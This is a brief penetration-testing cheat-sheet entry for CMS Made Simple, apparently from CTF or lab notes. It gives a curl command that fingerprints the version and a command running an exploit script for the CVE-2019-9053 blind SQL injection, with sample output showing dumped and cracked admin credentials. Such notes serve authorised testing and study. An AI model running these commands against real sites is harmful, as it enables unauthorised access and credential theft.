# CMS Made Simple

### Identify version

Check /doc/CHANGELOG.txt — Version determines SQLi availability

```bash
curl -s http://$IP/doc/CHANGELOG.txt | head -10
```

---

### SQLi (CVE-2019-9053)

Blind SQLi on CMS Made Simple < 2.2.10 — Dumps admin credentials

```bash
python3 cmsms_sqli.py -u http://$IP/ --crack -w /usr/share/wordlists/rockyou.txt
```

<details>
<summary>Example Output</summary>

```
[+] Salt for password found: xxxxxxxx
[+] Username found: admin
[+] Email found: admin@site.com
[+] Password found: SuperSecret
```
</details>

---
